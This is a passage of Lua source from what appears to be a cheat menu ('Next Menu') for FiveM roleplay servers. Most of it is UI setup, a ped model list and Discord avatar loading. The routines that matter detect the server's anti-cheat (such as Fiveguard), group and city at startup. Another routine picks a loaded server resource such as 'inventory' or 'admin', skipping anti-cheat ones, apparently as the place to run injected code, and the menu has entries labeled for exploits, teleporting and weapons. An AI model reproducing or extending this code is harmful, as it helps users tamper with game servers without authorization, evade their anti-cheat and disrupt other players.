                { name = "kid_ad_01",                    hash = "kid_ad_01" },
                { name = "LV_closetliz",                    hash = "LV_closetliz" },
                { name = "baby_gabriel_02",                    hash = "baby_gabriel_02" },
                { name = "baby_gabriel_03",                    hash = "baby_gabriel_03" },
                { name = "baby_rebeca",                    hash = "baby_rebeca" },
                { name = "baby_bella",                    hash = "baby_bella" },
                { name = "baby_freem",                    hash = "baby_freem" },
                { name = "baby_free_02",                    hash = "baby_free_02" },
                { name = "baby_alice_03",                    hash = "baby_alice_03" },
                { name = "baby_kidfree",                    hash = "baby_kidfree" },
                { name = "baby_sonny",                    hash = "baby_sonny" },
                { name = "baby_lua_02",                    hash = "baby_lua_02" },
                { name = "baby_giullia",                    hash = "baby_giullia" },
                { name = "baby_sol",                    hash = "baby_sol" },
                { name = "baby_theo",                    hash = "baby_theo" },
                { name = "baby_brisa",                    hash = "baby_brisa" },
                { name = "baby_luazinha_03",                    hash = "baby_luazinha_03" },
                { name = "Vb", hash = "Vb" },
                { name = "Va", hash = "Va" },
                { name = "sandra", hash = "sandra" },
                { name = "ig_death", hash = "ig_death" },
                { name = "GG_Sonic", hash = "GG_Sonic" },
                { name = "GG_MeninaNoel", hash = "GG_MeninaNoel" },
                { name = "GG_MeninoNoel", hash = "GG_MeninoNoel" },
                { name = "GG_Medica", hash = "GG_Medica" },
                { name = "GG_Medico", hash = "GG_Medico" },
                { name = "GG_MamaeNoel", hash = "GG_MamaeNoel" },
                { name = "GG_Isis", hash = "GG_Isis" },
                { name = "GG_Furia", hash = "GG_Furia" },
                { name = "GG_Duenda", hash = "GG_Duenda" },
                { name = "GG_Duende", hash = "GG_Duende" },
                { name = "GG_Dipsy", hash = "GG_Dipsy" },
                { name = "GG_Coelho", hash = "GG_Coelho" },
                { name = "GG_Coelha", hash = "GG_Coelha" },
                { name = "GG_Charmander", hash = "GG_Charmander" },
                { name = "GG_Bianca", hash = "GG_Bianca" },
                { name = "GG_Bezerra", hash = "GG_Bezerra" },
                { name = "GG_Bezerro", hash = "GG_Bezerro" },
                { name = "GG_Banguela", hash = "GG_Banguela" },
                { name = "AdultoMichaelJacksonFiveXStore", hash = "AdultoMichaelJacksonFiveXStore" },
                { name = "1SD_F1", hash = "1SD_F1" },
                { name = "ninja", hash = "ninja" },
                { name = "baby_natt_02",                    hash = "baby_natt_02" },
                { name = "baby_perick",                    hash = "baby_perick" },
                { name = "baby_plucifer",                    hash = "baby_plucifer" },
                { name = "baby_helo",                    hash = "baby_helo" },
                { name = "baby_chefinho_02",                    hash = "baby_chefinho_02" },
                { name = "baby_carol",                    hash = "baby_carol" },
                { name = "baby_natt",                    hash = "baby_natt" },
                { name = "baby_hannanogs",                    hash = "baby_hannanogs" },
                { name = "baby_cerejinha_04",                    hash = "baby_cerejinha_04" },
                { name = "baby_pandinha_02",                    hash = "baby_pandinha_02" },
                { name = "baby_lucifer",                    hash = "baby_lucifer" },
                { name = "baby_luquinhas",                    hash = "baby_luquinhas" },
                { name = "baby_maske",                    hash = "baby_maske" },
                { name = "baby_luanzin",                    hash = "baby_luanzin" },
                { name = "baby_luanzin_02",                    hash = "baby_luanzin_02" },
                { name = "baby_vanellope",                    hash = "baby_vanellope" },
                { name = "baby_pkzinho_02",                    hash = "baby_pkzinho_02" },
                { name = "baby_rich",                    hash = "baby_rich" },
                { name = "baby_boy",                    hash = "baby_boy" },
                { name = "baby_sophia_03",                    hash = "baby_sophia_03" },
                { name = "baby_maya_04",                    hash = "baby_maya_04" },
                { name = "baby_nero_02",                    hash = "baby_nero_02" },
                { name = "baby_matheus",                    hash = "baby_matheus" },
                { name = "baby_mila",                    hash = "baby_mila" },
                { name = "baby_ben10",                    hash = "baby_ben10" },
                { name = "baby_carol_02",                    hash = "baby_carol_02" },
                { name = "baby_paiva",                    hash = "baby_paiva" },
                { name = "baby_alves",                    hash = "baby_alves" },
                { name = "baby_kate",                    hash = "baby_kate" },
                { name = "baby_rafa",                    hash = "baby_rafa" },
                { name = "baby_mon",                    hash = "baby_mon" },
                { name = "baby_heather",                    hash = "baby_heather" },
                { name = "baby_paola",                    hash = "baby_paola" },
                { name = "baby_flolly",                    hash = "baby_flolly" },
                { name = "baby_helena",                    hash = "baby_helena" },
                { name = "baby_theus_02",                    hash = "baby_theus_02" },
                { name = "baby_freef",                    hash = "baby_freef" },
                { name = "baby_gabillith",                    hash = "baby_gabillith" },
                { name = "baby_pandinha",                    hash = "baby_pandinha" },
                { name = "baby_apollo",                    hash = "baby_apollo" },
                { name = "baby_theus",                    hash = "baby_theus" },
                { name = "baby_tiff",                    hash = "baby_tiff" },
                { name = "baby_braga",                    hash = "baby_braga" },
                { name = "baby_braga_02",                    hash = "baby_braga_02" },
                { name = "baby_bequinha",                    hash = "baby_bequinha" },
                { name = "baby_amber",                    hash = "baby_amber" },
                { name = "LUCIFERINA_TeenDudaFix",                    hash = "LUCIFERINA_TeenDudaFix" },
                { name = "baby_cowboyzinho",                    hash = "baby_cowboyzinho" },
                { name = "baby_cristalzinha",                    hash = "baby_cristalzinha" },
                { name = "baby_kratos",                    hash = "baby_kratos" },
                { name = "baby_lua",                    hash = "baby_lua" },
                { name = "baby_pandora",                    hash = "baby_pandora" },
                { name = "baby_kyan",                    hash = "baby_kyan" },
                { name = "baby_pietro_04",                    hash = "baby_pietro_04" },
                { name = "baby_noah_03",                    hash = "baby_noah_03" },
                { name = "baby_raposo",                    hash = "baby_raposo" },
                { name = "baby_noah_02",                    hash = "baby_noah_02" },
                { name = "baby_maya_03",                    hash = "baby_maya_03" },
                { name = "baby_melissa_02",                    hash = "baby_melissa_02" },
                { name = "baby_san",                    hash = "baby_san" },
                { name = "baby_estrela_02",                    hash = "baby_estrela_02" },
                { name = "baby_betina",                    hash = "baby_betina" },
                { name = "baby_lenon",                    hash = "baby_lenon" },
                { name = "baby_guerreiro",                    hash = "baby_guerreiro" },
                { name = "baby_cerejinha_03",                    hash = "baby_cerejinha_03" },
                { name = "baby_max",                    hash = "baby_max" },
                { name = "baby_axolo",                    hash = "baby_axolo" },
                { name = "baby_maya_02",                    hash = "baby_maya_02" },
                { name = "baby_ada",                    hash = "baby_ada" },
                { name = "baby_nano",                    hash = "baby_nano" },
                { name = "baby_lion",                    hash = "baby_lion" },
                { name = "baby_padeiro",                    hash = "baby_padeiro" },
                { name = "baby_biel",                    hash = "baby_biel" },
                { name = "baby_alexa",                    hash = "baby_alexa" },
                { name = "baby_luh",                    hash = "baby_luh" },
                { name = "husky",                    hash = "husky" },
                { name = "tigre",                    hash = "tigre" },
                { name = "baby_estrela",                    hash = "baby_estrela" },
                { name = "baby_fernanda",                    hash = "baby_fernanda" },
                { name = "baby_reg",                    hash = "baby_reg" },
                { name = "baby_luan",                    hash = "baby_luan" },
                { name = "baby_gabriel",                    hash = "baby_gabriel" },
                { name = "baby_jessica_02",                    hash = "baby_jessica_02" },
                { name = "baby_miley",                    hash = "baby_miley" },
                { name = "baby_pietro_03",                    hash = "baby_pietro_03" },
                { name = "baby_gabis",                    hash = "baby_gabis" },
                { name = "baby_traxx",                    hash = "baby_traxx" },
                { name = "baby_malia",                    hash = "baby_malia" },
                { name = "baby_tavares_02",                    hash = "baby_tavares_02" },
                { name = "baby_cristal",                    hash = "baby_cristal" },
                { name = "baby_roger",                    hash = "baby_roger" },
                { name = "baby_dani",                    hash = "baby_dani" },
                { name = "baby_itan",                    hash = "baby_itan" },
                { name = "baby_noah",                    hash = "baby_noah" },
                { name = "baby_liana",                    hash = "baby_liana" },
                { name = "baby_silmara",                    hash = "baby_silmara" },
                { name = "baby_pietra",                    hash = "baby_pietra" },
                { name = "baby_bruna",                    hash = "baby_bruna" },
                { name = "baby_gusta",                    hash = "baby_gusta" },
                { name = "baby_melissa",                    hash = "baby_melissa" },
                { name = "baby_predrugo",                    hash = "baby_predrugo" },
                { name = "baby_aninha",                    hash = "baby_aninha" },
                { name = "baby_haru_02",                    hash = "baby_haru_02" },
                { name = "baby_layla",                    hash = "baby_layla" },
                { name = "CS_NexusKidC",                    hash = "CS_NexusKidC" },
                { name = "kid_nexus_01",                    hash = "kid_nexus_01" },
                { name = "kid_nexus_02",                    hash = "kid_nexus_02" },
                { name = "baby_toddler_01",                    hash = "baby_toddler_01" },
                { name = "baby_toddler_02",                    hash = "baby_toddler_02" },
                { name = "baby_toddler_03",                    hash = "baby_toddler_03" },
                { name = "baby_toddler_04",                    hash = "baby_toddler_04" },
                { name = "baby_toddler_05",                    hash = "baby_toddler_05" },
                { name = "baby_pedrinho",                    hash = "baby_pedrinho" },
                { name = "baby_beca_02",                    hash = "baby_beca_02" },
                { name = "baby_vitin",                    hash = "baby_vitin" },
                { name = "baby_haru",                    hash = "baby_haru" },
                { name = "baby_clara",                    hash = "baby_clara" },
                { name = "baby_lucas_02",                    hash = "baby_lucas_02" },
                { name = "baby_duda_02",                    hash = "baby_duda_02" },
                { name = "baby_isis",                    hash = "baby_isis" },
                { name = "baby_cerejinha_02",                    hash = "baby_cerejinha_02" },
                { name = "baby_alice_02",                    hash = "baby_alice_02" },
                { name = "baby_alexandre_02",                    hash = "baby_alexandre_02" },
                { name = "baby_annie",                    hash = "baby_annie" },
                { name = "baby_lucca_02",                    hash = "baby_lucca_02" },
                { name = "baby_tavares",                    hash = "baby_tavares" },
                { name = "baby_victor",                    hash = "baby_victor" },
                { name = "baby_pkzinho",                    hash = "baby_pkzinho" },
                { name = "baby_kinhax",                    hash = "baby_kinhax" },
                { name = "baby_alexandre",                    hash = "baby_alexandre" },
                { name = "baby_sophia_02",                    hash = "baby_sophia_02" },
                { name = "baby_lud_02",                    hash = "baby_lud_02" },
                { name = "baby_vanessa",                    hash = "baby_vanessa" },
                { name = "baby_lucca",                    hash = "baby_lucca" },
                { name = "baby_maya",                    hash = "baby_maya" },
                { name = "baby_mariana",                    hash = "baby_mariana" },
                { name = "baby_mia",                    hash = "baby_mia" },
                { name = "baby_savannah",                    hash = "baby_savannah" },
                { name = "baby_pietro_02",                    hash = "baby_pietro_02" },
                { name = "baby_jadezinha",                    hash = "baby_jadezinha" },
                { name = "baby_luazinha_02",                    hash = "baby_luazinha_02" },
                { name = "baby_dg",                    hash = "baby_dg" },
                { name = "baby_teensayuu",                    hash = "baby_teensayuu" },
                { name = "baby_yzzie",                    hash = "baby_yzzie" },
                { name = "baby_cerejinha",                    hash = "baby_cerejinha" },
                { name = "baby_enrico",                    hash = "baby_enrico" },
                { name = "baby_kiara",                    hash = "baby_kiara" },
                { name = "baby_akira",                    hash = "baby_akira" },
                { name = "baby_dylan",                    hash = "baby_dylan" },
                { name = "baby_julia",                    hash = "baby_julia" },
                { name = "baby_dolvio",                    hash = "baby_dolvio" },
                { name = "baby_gomez",                    hash = "baby_gomez" },
                { name = "baby_russinho_02",                    hash = "baby_russinho_02" },
                { name = "baby_lud",                    hash = "baby_lud" },
                { name = "baby_joana",                    hash = "baby_joana" },
                { name = "baby_cigano",                    hash = "baby_cigano" },
                { name = "baby_liz",                    hash = "baby_liz" },
                { name = "baby_leon",                    hash = "baby_leon" },
                { name = "baby_catty",                    hash = "baby_catty" },
                { name = "baby_itachi",                    hash = "baby_itachi" },
                { name = "baby_edu",                    hash = "baby_edu" },
                { name = "baby_blue_2",                    hash = "baby_blue_2" },
                { name = "baby_memel",                    hash = "baby_memel" },
                { name = "baby_russinho",                    hash = "baby_russinho" },
                { name = "baby_gaby",                    hash = "baby_gaby" },
                { name = "baby_dave",                    hash = "baby_dave" },
                { name = "baby_mll",                    hash = "baby_mll" },
                { name = "baby_blue",                    hash = "baby_blue" },
                { name = "baby_nilo",                    hash = "baby_nilo" },
                { name = "baby_heloisa",                    hash = "baby_heloisa" },
                { name = "baby_vitor",                    hash = "baby_vitor" },
                { name = "baby_jade",                    hash = "baby_jade" },
                { name = "baby_kotaka",                    hash = "baby_kotaka" },
                { name = "baby_nero",                    hash = "baby_nero" },
                { name = "baby_lupita",                    hash = "baby_lupita" },
                { name = "baby_anac",                    hash = "baby_anac" },
                { name = "baby_rosinha",                    hash = "baby_rosinha" },
                { name = "baby_soldado",                    hash = "baby_soldado" },
                { name = "baby_lilith",                    hash = "baby_lilith" },
                { name = "baby_chefinho",                    hash = "baby_chefinho" },
                { name = "baby_joao",                    hash = "baby_joao" },
                { name = "baby_alice",                    hash = "baby_alice" },
                { name = "baby_beca",                    hash = "baby_beca" },
                { name = "baby_rodrigo",                    hash = "baby_rodrigo" },
                { name = "baby_tati",                    hash = "baby_tati" },
                { name = "baby_luiza",                    hash = "baby_luiza" },
                { name = "baby_pietro",                    hash = "baby_pietro" },
                { name = "baby_gtzinho",                    hash = "baby_gtzinho" },
                { name = "baby_gabriela",                    hash = "baby_gabriela" },
                { name = "baby_maya_05",                    hash = "baby_maya_05" },
                { name = "baby_gabi",                    hash = "baby_gabi" },
                { name = "baby_erva",                    hash = "baby_erva" },
                { name = "baby_dudinha",                    hash = "baby_dudinha" },
                { name = "baby_naomi",                    hash = "baby_naomi" },
                { name = "baby_ana",                    hash = "baby_ana" },
                { name = "baby_lucas",                    hash = "baby_lucas" },
                { name = "kid_nilo",                    hash = "kid_nilo" },
                { name = "baby_free",                    hash = "baby_free" },
                { name = "baby_jessica_2",                    hash = "baby_jessica_2" },
                { name = "baby_jessica",                    hash = "baby_jessica" },
                { name = "baby_darkzinho",                    hash = "baby_darkzinho" },
                { name = "baby_anna",                    hash = "baby_anna" },
                { name = "baby_sophia",                    hash = "baby_sophia" },
                { name = "baby_luazinha",                    hash = "baby_luazinha" },
                { name = "baby_dudaf",                    hash = "baby_dudaf" },
                { name = "baby_dudah",                    hash = "baby_dudah" },
                { name = "kid_ad_02",                    hash = "kid_ad_02" },
                { name = "kid_ad_03",                    hash = "kid_ad_03" },
                { name = "kid_ad_04",                    hash = "kid_ad_04" },
                { name = "baby_01",                    hash = "baby_01" },
                { name = "baby_02",                    hash = "baby_02" },
                { name = "baby_boy_01",                    hash = "baby_boy_01" },
                { name = "baby_boy_02",                    hash = "baby_boy_02" },
                { name = "kid_cf_01",                    hash = "kid_cf_01" },
                { name = "kid_cf_02",                    hash = "kid_cf_02" },
                { name = "kid_cm_01",                    hash = "kid_cm_01" },
                { name = "kid_cm_02",                    hash = "kid_cm_02" },
                { name = "baby_girl_01",                    hash = "baby_girl_01" },
                { name = "baby_girl_02",                    hash = "baby_girl_02" },
                { name = "baby_stevan",                    hash = "baby_stevan" },
                { name = "baby_lipenogs",                    hash = "baby_lipenogs" },
                { name = "a_c_sheep",                    hash = "a_c_sheep" },
                { name = "a2n_gordodanielzinho_01",                    hash = "a2n_gordodanielzinho_01" },
                { name = "crocodilo",                    hash = "crocodilo" },
                { name = "omex_retro_f_bot",                    hash = "omex_retro_f_bot" },
                { name = "omex_retro_m_bot",                    hash = "omex_retro_m_bot" },
                { name = "Dragao1",                    hash = "Dragao1" },
                { name = "Dragao2",                    hash = "Dragao2" },
                { name = "Dragao3",                    hash = "Dragao3" },
                { name = "Dragao4",                    hash = "Dragao4" },
                { name = "Dragao5",                    hash = "Dragao5" },
                { name = "Dragao6",                    hash = "Dragao6" },
                { name = "Dragao7",                    hash = "Dragao7" },
                { name = "Dragao8",                    hash = "Dragao8" },
            },
        },
        bool = {},
        frame =
        {
            addValues =
            {
                ['default'] = 32,
                ['button'] = 22,
                ['checkbox'] = 22,
                ['combobox'] = 50,
                ['slider'] = 22,
                ['input'] = 25,
                ['listsearch'] = 54,
                ['listitem'] = 27,
            },
            blockClicks = false,
        },
        binds =
        {
            checkboxes = {},
            buttons = {},
        },
        selPlayer = nil,
        selVehicle = nil,
    }
    my.cache =
    {
        leftPressed = false,
    }
    for id, table in pairs(my.images) do
        if id then
            FrameAPI.Images.ImportImageFromUrl(id, table.url)
        end
    end
    function my.brand.setAspectLogo(url)
        my.brand.aspectLogoUrl = url or ""
        if my.brand.aspectLogoUrl ~= "" then
            FrameAPI.Images.ImportImageFromUrl('aspect_logo', my.brand.aspectLogoUrl)
        end
    end
    local function getDiscordField(info, fieldName, fallbackName)
        local function readField(name)
            if not name then return nil end
            local okField, field = pcall(function()
                return info[name]
            end)
            if not okField then return nil end
            if type(field) == 'function' then
                local okValue, value = pcall(field)
                if not okValue then
                    okValue, value = pcall(field, info)
                end
                if okValue then return value end
            elseif field ~= nil then
                return field
            end
            return nil
        end
        local value = readField(fieldName)
        if value == nil or tostring(value) == '' then
            value = readField(fallbackName)
        end
        return value
    end
    local function decodeDiscordHttpResponse(response)
        if type(response) == 'table' then
            local body = response.body or response.data or response.response or response.content
            if type(body) == 'table' then
                return body
            end
            if type(body) == 'string' and body ~= '' then
                local okDecode, decoded = pcall(json.decode, body)
                if okDecode and type(decoded) == 'table' then
                    return decoded
                end
            end
            return response
        end

        if type(response) == 'string' and response ~= '' then
            local okDecode, decoded = pcall(json.decode, response)
            if okDecode and type(decoded) == 'table' then
                return decoded
            end
        end

        return nil
    end

    local function importDiscordAvatar(discordAPI, avatarUrl)
        if not avatarUrl or tostring(avatarUrl) == '' then
            return false
        end

        avatarUrl = tostring(avatarUrl)

        local imageAPI = discordAPI and discordAPI.Images
        if imageAPI and imageAPI.ImportImageFromUrl then
            local okImport = pcall(imageAPI.ImportImageFromUrl, 'discordAvatar', avatarUrl)
            if okImport then
                my.brand.discord.avatarUrl = avatarUrl
                my.brand.discord.avatarLoaded = true
                return true
            end
        end

        if FrameAPI and FrameAPI.Images and FrameAPI.Images.ImportImageFromUrl then
            local okImport = pcall(FrameAPI.Images.ImportImageFromUrl, 'discordAvatar', avatarUrl)
            if okImport then
                my.brand.discord.avatarUrl = avatarUrl
                my.brand.discord.avatarLoaded = true
                return true
            end
        end

        return false
    end

    function my.brand.refreshDiscordInfo()
        local discordAPI = FrameAPI or FrameAPI
        my.brand.discord.avatarLoaded = false

        local okRole, role = pcall(function()
            return next.cargos.get_role()
        end)
        my.brand.discord.role = (okRole and role and tostring(role) ~= '') and tostring(role) or 'Cliente'

        local fallbackName = nil
        local okFallback, fallback = pcall(function()
            return FrameAPI.GetUsername()
        end)
        if okFallback and fallback and tostring(fallback) ~= '' then
            fallbackName = tostring(fallback)
            my.brand.discord.name = fallbackName
        end

        if not discordAPI or not discordAPI.GetDiscordInfo then
            return
        end

        local ok, info, secondValue, discordId = pcall(discordAPI.GetDiscordInfo)
        if not ok then
            ok, info, secondValue, discordId = pcall(discordAPI.GetDiscordInfo, discordAPI)
        end
        if not ok then
            return
        end

        local infoTable = nil
        if type(info) == 'table' then
            infoTable = info
        elseif type(secondValue) == 'table' then
            infoTable = secondValue
        elseif type(discordId) == 'table' then
            infoTable = discordId
        end

        my.brand.discord.info = infoTable

        local username = nil
        if infoTable then
            username = getDiscordField(infoTable, 'UserName', 'userName')
                or getDiscordField(infoTable, 'Username', 'username')
                or getDiscordField(infoTable, 'DiscordName', 'discordName')
        end

        if (not username or tostring(username) == '') and info ~= nil and type(info) ~= 'table' then
            local value = tostring(info)
            if value ~= '' and not value:match('^%d+$') and not value:match('^https?://') then
                username = value
            end
        end

        if username and tostring(username) ~= '' then
            my.brand.discord.name = tostring(username)
        elseif fallbackName then
            my.brand.discord.name = fallbackName
        end

        local avatarUrl = nil
        if infoTable then
            avatarUrl = getDiscordField(infoTable, 'UserAvatar', 'userAvatar')
                or getDiscordField(infoTable, 'AvatarUrl', 'avatarUrl')
                or getDiscordField(infoTable, 'Avatar', 'avatar')
        end

        if not avatarUrl and type(secondValue) == 'string' and secondValue:match('^https?://') then
            avatarUrl = secondValue
        end

        if avatarUrl and importDiscordAvatar(discordAPI, avatarUrl) then
            return
        end

        local id = discordId
        if infoTable then
            id = getDiscordField(infoTable, 'DiscordId', 'discordId')
                or getDiscordField(infoTable, 'DiscordID', 'discordID')
                or getDiscordField(infoTable, 'UserId', 'userId')
                or getDiscordField(infoTable, 'UserID', 'userID')
                or getDiscordField(infoTable, 'Id', 'id')
                or id
        end

        if (not id or tostring(id) == '' or not tostring(id):match('^%d+$')) then
            if secondValue ~= nil and type(secondValue) ~= 'table' and tostring(secondValue):match('^%d+$') then
                id = secondValue
            elseif info ~= nil and type(info) ~= 'table' and tostring(info):match('^%d+$') then
                id = info
            end
        end

        if not id or tostring(id) == '' then
            return
        end

        my.brand.discord.id = tostring(id)

        if discordAPI.RequestHTTP then
            local requestOk, response = pcall(
                discordAPI.RequestHTTP,
                'https://cdn.sharksoftwares.com.br/fetchUserAvatar?id=' .. tostring(id),
                { method = 'GET' }
            )

            if not requestOk then
                requestOk, response = pcall(
                    discordAPI.RequestHTTP,
                    discordAPI,
                    'https://cdn.sharksoftwares.com.br/fetchUserAvatar?id=' .. tostring(id),
                    { method = 'GET' }
                )
            end

            if requestOk and response then
                local msg = decodeDiscordHttpResponse(response)
                if msg then
                    local avatarHash = msg.message or msg.avatar or msg.avatarHash or msg.hash
                    if avatarHash and tostring(avatarHash) ~= '' then
                        local cdnAvatar = 'https://cdn.discordapp.com/avatars/'
                            .. tostring(id) .. '/' .. tostring(avatarHash) .. '.png?size=128'
                        importDiscordAvatar(discordAPI, cdnAvatar)
                    end
                end
            end
        end
    end
    my.fontAwesome = {
        font = FrameAPI.Fonts.CreateFontAwesome(),
        icons = {
            user       = "\xEF\x80\x87",
            car        = "\xEF\x86\xB9",
            users      = "\xEF\x83\x80",
            crosshairs = "\xEF\x81\x9B",
            gun        = "\xEE\x86\x9B",
            clothes    = "\xEF\x95\x93",
            code       = "\xEF\x84\xA1",
            eye        = "\xEF\x81\xAE",
            wrench     = "\xEF\x82\xAD",
            cog        = "\xEF\x80\x93",
            archive    = "\xEF\x86\x87",
            database   = "\xEF\x87\x80",
            stop       = "\xEF\x81\x8D",
            search     = "\xEF\x80\x82",
            keyboard   = "\xEF\x84\x9C",
            home       = "\xEF\x80\x95",
            marker     = "\xEF\x81\x81",
            list       = "\xEF\x80\xBA",
            sliders    = "\xEF\x87\x9E",
            check      = "\xEF\x80\x8C",
        }
    }
    function my.fontAwesome.forEntry(text, parentId)
        local value = string.lower(tostring(text or ''))
        if string.find(value, 'lista de player') or string.find(value, 'online') then return my.fontAwesome.icons.users end
        if string.find(value, 'lista de ve') then return my.fontAwesome.icons.list end
        if string.find(value, 've') and (string.find(value, 'culo') or string.find(value, 'iculo')) then return my.fontAwesome.icons.car end
        if string.find(value, 'armario') or string.find(value, 'armário') or string.find(value, 'roupa') or string.find(value, 'clothes') or string.find(value, 'outfit') then
            return my.fontAwesome.icons.clothes
        end
        if string.find(value, 'arma') or string.find(value, 'weapon') then return my.fontAwesome.icons.gun end
        if string.find(value, 'exploit') then return my.fontAwesome.icons.code end
        if string.find(value, 'visual') then return my.fontAwesome.icons.eye end
        if string.find(value, 'tun') then return my.fontAwesome.icons.wrench end
        if string.find(value, 'config') then return my.fontAwesome.icons.cog end
        if string.find(value, 'arm') then return my.fontAwesome.icons.archive end
        if string.find(value, 'state') then return my.fontAwesome.icons.database end
        if string.find(value, 'stop') then return my.fontAwesome.icons.stop end
        if string.find(value, 'teleport') then return my.fontAwesome.icons.marker end
        if parentId == 'vehicle' then return my.fontAwesome.icons.car end
        if parentId == 'weapon' then return my.fontAwesome.icons.gun end
        if parentId == 'visual' then return my.fontAwesome.icons.eye end
        if parentId == 'config' then return my.fontAwesome.icons.cog end
        return my.fontAwesome.icons.user
    end
    my.brand.setAspectLogo(my.brand.aspectLogoUrl)
    my.brand.refreshDiscordInfo()
    if my.brand.discord.avatarUrl ~= "" and not my.brand.discord.avatarLoaded then
        local okImport = pcall(function()
            FrameAPI.Images.ImportImageFromUrl('discordAvatar', my.brand.discord.avatarUrl)
        end)
        my.brand.discord.avatarLoaded = okImport
    end
    FrameAPI.Images.ImportImageFromUrl("colorpicker_gradient", "http://solar-ui-fivem.netlify.app/zenix/gradientpicker.png")
    FrameAPI.Images.ImportImageFromUrl("colorpicker_huebar", "http://solar-ui-fivem.netlify.app/zenix/gradientbar.png")
    my.math = {}
    function my.math.centerPos(w, h)
        local sW, sH = my.vars.screen.w, my.vars.screen.h
        return sW/2 - (w/2), sH/2 - (h/2)
    end
    my.math.RGBtoHSV = function(color)
        local r, g, b, a = color[1] / 255, color[2] / 255, color[3] / 255, (color[4] or 255) / 255
        local max, min = math.max(r, g, b), math.min(r, g, b)
        local h, s, v = 0, 0, max
        local d = max - min
        s = (max == 0 and 0 or d / max)
        if max ~= min then
            if max == r then
                h = (g - b) / d + (g < b and 6 or 0)
            elseif max == g then
                h = (b - r) / d + 2
            elseif max == b then
                h = (r - g) / d + 4
            end
            h = h / 6
        end
        return h * 360, s * 100, v * 100, a * 100
    end
    my.math.HSVtoRGB = function(hue, saturation, value)
        hue = hue / 360
        saturation = saturation / 100
        value = value / 100
        local r, g, b
        local hue_sector = math.floor(hue * 6)
        local f = hue * 6 - hue_sector
        local p = value * (1 - saturation)
        local q = value * (1 - f * saturation)
        local t = value * (1 - (1 - f) * saturation)
        hue_sector = hue_sector % 6
        if hue_sector == 0 then
            r, g, b = value, t, p
        elseif hue_sector == 1 then
            r, g, b = q, value, p
        elseif hue_sector == 2 then
            r, g, b = p, value, t
        elseif hue_sector == 3 then
            r, g, b = p, q, value
        elseif hue_sector == 4 then
            r, g, b = t, p, value
        elseif hue_sector == 5 then
            r, g, b = value, p, q
        end
        return {math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)}
    end
    my.math.rgbToHex = function(color)
        r = math.min(255, math.max(0, color[1]))
        g = math.min(255, math.max(0, color[2]))
        b = math.min(255, math.max(0, color[3]))
        return string.format("%02X%02X%02X", r, g, b)
    end
    isLeftButtonJustPressed = function ()
        return my.cache.leftJustPressed or false
    end
    isLeftButtonPressed = function ()
        return my.cache.leftPressed or false
    end
    IsKeyJustPressed = function (vkCode)
        return FrameAPI.IsKeyJustPressed(vkCode) or false
    end
    IsKeyPressed = function (vkCode)
        return FrameAPI.IsKeyPressed(vkCode) or false
    end
    nt.createTh(function()
        while not (my.interact and my.interact.Notify) do
            Wait(0)
        end
        if next and next.DetectGroup then
            pcall(next.DetectGroup)
        end
        if next and next.DetectAc then
            pcall(next.DetectAc)
        end
        if next and next.ServerInfo then
            pcall(next.ServerInfo)
        end
        group = (next.server_info and next.server_info.group) or "Não Achado"
        anticheat = (next.server_info and next.server_info.ac) or "Não Detectado"
        city = (next.server_info and next.server_info.city) or "Não Achado"
        players = next.server_info and next.server_info.players or nil
        local detectedCityName = tostring(city)
        local okServerInfo, serverInfo = pcall(function()
            return FrameAPI.GetServerInfo()
        end)
        if okServerInfo and serverInfo then
            local okName, serverName = pcall(function()
                return serverInfo.Name()
            end)
            if okName and serverName and tostring(serverName) ~= "" then
                detectedCityName = tostring(serverName)
            end
        end
        local groupCodes = {
            ["Starships"] = "STARSHIPS",
            ["Starships Group"] = "STARSHIPS",
            ["Lotus Group"] = "LOTUSG",
            ["Nexus Group"] = "NEXUS",
            ["Space Group"] = "SPACE",
            ["Fusion Group"] = "FUSION",
            ["Noway Group"] = "FLUXO",
            ["Santa Group"] = "SANTA",
        }
        my.general.groupName = tostring(group)
        my.general.group = groupCodes[group] or ((city == "Filadelfia Rp") and "FILADELFIA" or tostring(group))
        my.general.name = tostring(city)
        my.general.anticheatName = (anticheat == "Fiveguard") and "FiveGuard" or tostring(anticheat)
        local username = tostring(FrameAPI.GetUsername() or "Usuário")
        my.interact.Notify("Olá, " .. username .. "! Autenticado com sucesso.", "Next Menu", my.fontAwesome.icons.user, 4500)
        my.interact.Notify("Anti-cheat: " .. tostring(anticheat), "Detecção", my.fontAwesome.icons.cog, 5000)
        my.interact.Notify("Cidade: " .. detectedCityName .. " | Grupo: " .. tostring(group), "Servidor", my.fontAwesome.icons.home, 5500)
    end)
    local mysticEssential = {}
    function mysticEssential.defineResourceMain()
            local finded = false
            local table = FrameAPI.GetLoadedResources()
            if not table then
                table =
                {
                }
            end
            for i, name in ipairs(table) do
                if name == 'inventory' or string.lower(name) == 'inventory' or string.upper(name) == 'inventory' or string.lower(name) == 'animacoes' or string.upper(name) == 'animacoes'  or string.upper(name) == 'admin' or string.lower(name) == "admin" then
                    my.general.resource = name
                    finded = true
                    break
                end
            end
            if not finded then
                for i, name in ipairs(table) do
                    local blockedResources = name ~= 'vrp' and name ~= 'ThnAC' and name ~= 'cfx-gabz-mapdata'and name ~= 'lafy'and name ~= 'residences'and name ~= 'smartphone' and name ~= 'smartphone-jobs' and name ~= 'monitor' and name ~= 'sessionmanager' and name ~= 'hooka'  and name ~= 'carros_brasileiro' and name ~= 'chat' and name ~= 'testes' and name ~= 'vrp_admin' and name ~= 'pma-voice' and name ~= 'vrp_sounds' and name ~= string.lower('vrp') and name ~= string.lower('VRP') and #name > 3
                    if string.find(name, 'vrp') and blockedResources then
                        my.general.resource = name
                        finded = true
                        break
                    end
                end
                for i, name in ipairs(table) do
                    local blockedResources = name ~= 'vrp' and name ~= 'ThnAC' and name ~= 'cfx-gabz-mapdata'and name ~= 'lafy'and name ~= 'residences'and name ~= 'smartphone' and name ~= 'smartphone-jobs'  and name ~= 'monitor'and name ~= 'sessionmanager'  and name ~= 'hooka' and name ~= 'carros_brasileiro' and name ~= 'chat' and name ~= 'testes' and name ~= 'vrp_admin' and name ~= 'pma-voice' and name ~= 'vrp_sounds' and name ~= string.lower('vrp') and name ~= string.lower('VRP') and #name > 3
                    if blockedResources then
                        my.general.resource = name
                        finded = true
                        break
                    end
                end
            end
    end
    local validPeds = {}
    for i, item in ipairs(my.vars.tablePeds) do
        if IsModelAPed(item.hash) then
            table.insert(validPeds, item)
        end
    end
    my.anim = {}
    function my.anim.lerp(a, b, t)
        return a * (1 - t) + b * (t)
    end
    my.ui = {}

    local _DrawRect = FrameAPI.Drawing.DrawRect
    local _DrawShadowRect = FrameAPI.Drawing.DrawShadowRect
